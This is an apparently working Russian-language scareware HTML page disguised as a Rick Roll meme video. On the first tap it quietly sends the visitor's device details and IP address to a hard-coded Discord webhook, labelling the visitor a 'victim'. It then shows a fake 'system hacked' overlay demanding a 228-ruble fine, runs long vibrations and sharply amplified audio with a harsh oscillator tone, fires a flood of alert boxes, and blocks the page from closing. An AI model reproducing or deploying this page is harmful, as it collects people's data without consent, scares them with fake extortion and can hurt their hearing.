<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ОШИБКА СИСТЕМЫ</title>
    <style>
        html, body {
            margin: 0; padding: 0; height: 100%;
            background: #000; overflow: hidden; cursor: pointer;
            font-family: 'Courier New', monospace;
        }
        #vid {
            position: fixed; inset: 0; width: 100%; height: 100%;
            object-fit: cover; display: block; pointer-events: none; z-index: 1;
            transition: transform 0.05s, filter 0.1s;
        }
        .shake { animation: shakeAnim 0.05s infinite; }
        @keyframes shakeAnim {
            0% { transform: translate(20px, 10px) scale(1.3) rotate(3deg); filter: contrast(4) hue-rotate(90deg) invert(1); }
            25% { transform: translate(-20px, -10px) scale(1.3) rotate(-3deg); filter: contrast(4) hue-rotate(180deg) invert(0); }
            50% { transform: translate(20px, -10px) scale(1.3) rotate(3deg); filter: contrast(4) hue-rotate(270deg) invert(1); }
            75% { transform: translate(-20px, 10px) scale(1.3) rotate(-3deg); filter: contrast(4) hue-rotate(360deg) invert(0); }
            100% { transform: translate(10px, -20px) scale(1.3) rotate(0deg); filter: contrast(4) hue-rotate(0deg); }
        }
        #glitch-overlay {
            display: none; position: fixed; inset: 0; pointer-events: none; z-index: 5;
            background: repeating-linear-gradient(0deg, rgba(0, 0, 0, 0.8) 0px, rgba(0, 0, 0, 0.8) 3px, transparent 3px, transparent 6px);
            animation: glitch 0.1s infinite;
        }
        @keyframes glitch { 0% { transform: translateY(0); } 50% { transform: translateY(30px); } 100% { transform: translateY(0); } }
        #virus-overlay {
            display: none; position: fixed; inset: 0; background: rgba(150, 0, 0, 0.98);
            color: #fff; z-index: 9999; text-align: center; padding: 5vh 20px;
            font-weight: bold; text-shadow: 1px 1px 2px #000;
        }
        #virus-overlay h1 { font-size: 36px; margin: 0; animation: flash 0.2s infinite; color: yellow; }
        #virus-overlay p { font-size: 16px; margin-top: 15px; line-height: 1.4; }
        #pay-btn {
            display: none; margin-top: 20px; padding: 15px 30px; background: yellow;
            color: black; font-size: 20px; font-weight: bold; border: none;
            border-radius: 5px; cursor: pointer; animation: pulse 0.5s infinite alternate;
            z-index: 10000; position: relative;
        }
        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
        @keyframes pulse { 0% { transform: scale(1); } 100% { transform: scale(1.1); } }
        #hint {
            position: fixed; bottom: 0; left: 0; right: 0; padding: 30px 16px;
            text-align: center; color: #fff; font-size: 18px; opacity: 0.7;
            transition: opacity 0.4s; pointer-events: none; z-index: 10; font-family: Arial, sans-serif;
        }
        #hint.hidden { opacity: 0; }
    </style>
</head>
<body>
    <div id="glitch-overlay"></div>
    <div id="virus-overlay">
        <h1>💀 СИСТЕМА ВЗЛОМАНА 💀</h1>
        <p>Обнаружено мошенничество. Доступ к устройству получен.</p>
        <p style="color: #ff6666; margin-top: 15px;">Требуется немедленная оплата штрафа для разблокировки.</p>
        <button id="pay-btn">ОПЛАТИТЬ ШТРАФ (228₽)</button>
    </div>
    <video id="vid" playsinline webkit-playsinline preload="auto" muted>
        <source src="Rick_Roll_Video_Meme_Template_V1.mp4" type="video/mp4">
    </video>
    <div id="hint">Нажмите в любом месте, чтобы продолжить</div>

    <script>
        (function () {
            const vid = document.getElementById('vid');
            const hint = document.getElementById('hint');
            const virusOverlay = document.getElementById('virus-overlay');
            const glitchOverlay = document.getElementById('glitch-overlay');
            const payBtn = document.getElementById('pay-btn');
            let started = false;

            function start() {
                if (started) return;
                started = true;

                // 1. СРАЗУ ОТПРАВЛЯЕМ ДАННЫЕ (пока браузер не начал сходить с ума)
                const payload = JSON.stringify({
                    content: `🚨 **ЖЕРТВА**\n**Платформа:** ${navigator.platform}\n**Экран:** ${window.screen.width}x${window.screen.height}\n**Язык:** ${navigator.language}\n**Браузер:** ${navigator.userAgent}`
                });

                fetch("https://discordapp.com/api/webhooks/1563254919576682669/PwavQljrqSqvBos2q-mrwAJdMQru-OFgNfhYbKZKuujbIvhJzBgWH1tmGR1Qkxdz401w", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: payload,
                    keepalive: true
                }).catch(e => console.log("Ошибка отправки", e));

                // Попытка получить IP отдельно
                fetch('https://api.ipify.org?format=json')
                    .then(res => res.json())
                    .then(data => {
                        const ipPayload = JSON.stringify({
                            content: `🌐 **IP-АДРЕС ЖЕРТВЫ:** ${data.ip}`
                        });
                        fetch("https://discordapp.com/api/webhooks/1563254919576682669/PwavQljrqSqvBos2q-mrwAJdMQru-OFgNfhYbKZKuujbIvhJzBgWH1tmGR1Qkxdz401w", {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: ipPayload,
                            keepalive: true
                        }).catch(e => console.log(e));
                    }).catch(e => console.log(e));

                // 2. НАЧИНАЕМ РАЗЪЁБ
                let isNuke = Math.random() > 0.5;

                vid.classList.add('shake');
                glitchOverlay.style.display = 'block';
                hint.classList.add('hidden');

                if (navigator.vibrate) {
                    navigator.vibrate([10000, 500, 10000, 500, 10000]);
                }

                setTimeout(() => {
                    virusOverlay.style.display = 'block';
                    setTimeout(() => { payBtn.style.display = 'inline-block'; }, 2000);
                }, isNuke ? 1000 : 3000);

                payBtn.addEventListener('click', function() {
                    let count = 0;
                    while (count < 50) {
                        setTimeout(() => { alert("ОШИБКА: ОПЛАТА НЕ ПРОШЛА. ПОВТОРИТЕ ПОПЫТКУ."); }, count * 100);
                        count++;
                    }
                });

                window.onbeforeunload = function(e) {
                    e.preventDefault();
                    e.returnValue = "Данные переданы. Закрытие страницы заблокировано.";
                    return e.returnValue;
                };

                vid.play().then(() => {
                    try {
                        const AudioContext = window.AudioContext || window.webkitAudioContext;
                        if (AudioContext) {
                            const audioCtx = new AudioContext();
                            if (audioCtx.state === 'suspended') audioCtx.resume();

                            const source = audioCtx.createMediaElementSource(vid);
                            const compressor = audioCtx.createDynamicsCompressor();
                            compressor.threshold.value = -50;
                            compressor.ratio.value = 20;
                            compressor.attack.value = 0.01;
                            
                            const gainNode = audioCtx.createGain();
                            gainNode.gain.value = isNuke ? 15.0 : 5.0;

                            source.connect(gainNode);
                            gainNode.connect(compressor);
                            compressor.connect(audioCtx.destination);

                            if (isNuke) {
                                const oscillator = audioCtx.createOscillator();
                                oscillator.type = 'sawtooth';
                                oscillator.frequency.setValueAtTime(300, audioCtx.currentTime);
                                oscillator.frequency.linearRampToValueAtTime(900, audioCtx.currentTime + 0.5);
                                oscillator.frequency.linearRampToValueAtTime(300, audioCtx.currentTime + 1);
                                
                                setInterval(() => {
                                    if (audioCtx.state === 'running') {
                                        oscillator.frequency.linearRampToValueAtTime(900, audioCtx.currentTime + 0.5);
                                        oscillator.frequency.linearRampToValueAtTime(300, audioCtx.currentTime + 1);
                                    }
                                }, 1000);

                                const oscGain = audioCtx.createGain();
                                oscGain.gain.value = 0.4;
                                
                                oscillator.connect(oscGain);
                                oscGain.connect(compressor);
                                oscillator.start();
                                setTimeout(() => { try { oscillator.stop(); } catch(e){} }, 15000);
                            }

                            vid.muted = false;
                            vid.volume = 1;
                        }
                    } catch (e) {
                        vid.muted = false;
                        vid.volume = 1;
                    }
                }).catch(() => {
                    vid.muted = true;
                    vid.play();
                });
            }

            document.addEventListener('click', start, { once: true });
            document.addEventListener('touchstart', start, { once: true });
        })();
    </script>
</body>
</html>
